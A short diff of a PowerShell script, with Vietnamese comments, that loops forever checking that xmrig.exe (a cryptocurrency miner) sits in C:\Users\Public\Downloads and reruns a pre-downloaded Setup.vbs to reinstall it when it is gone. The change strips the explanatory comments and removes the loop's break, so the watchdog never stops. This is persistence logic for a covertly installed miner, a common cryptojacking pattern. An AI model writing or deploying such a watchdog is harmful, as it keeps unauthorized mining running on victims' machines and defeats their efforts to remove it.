@@ -1,6 +1,4 @@
-# Đường dẫn tới xmrig.exe
 $xmrigPath = "C:\Users\Public\Downloads\xmrig-6.22.2\xmrig.exe"
-# Đường dẫn file Setup.vbs đã có sẵn (đã tải trước)
 $setupPath = "C:\Users\Public\Downloads\Setup.vbs"
 
 while ($true) {
@@ -13,8 +11,6 @@ while ($true) {
         } else {
             Write-Error "Không tìm thấy Setup.vbs tại: $setupPath"
         }
-
-        break  # Thoát vòng lặp sau khi chạy lại setup
     } else {
         Write-Host "✅ xmrig.exe vẫn tồn tại. Tiếp tục theo dõi..."
     }
